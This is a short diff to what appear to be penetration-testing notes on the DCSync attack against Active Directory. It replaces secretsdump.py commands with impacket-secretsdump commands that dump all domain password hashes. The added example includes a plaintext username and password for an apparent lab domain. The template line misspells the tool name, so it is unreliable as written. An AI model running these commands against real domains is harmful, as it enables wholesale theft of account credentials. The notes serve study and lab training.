@@ -64,8 +64,9 @@ DCSync is a technique for stealing the Active Directory password database by usi
 
 To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
 
-    secretsdump.py -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>@<dc_ip>
-    secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+    impacket-secretsdupm -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>:<password>@<dc_ip>
+
+    impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty:Sup3rS3cur3D0m@inU2eR@DC01.INLANEFREIGHT.LOCAL
 
     or with mimikatz
 
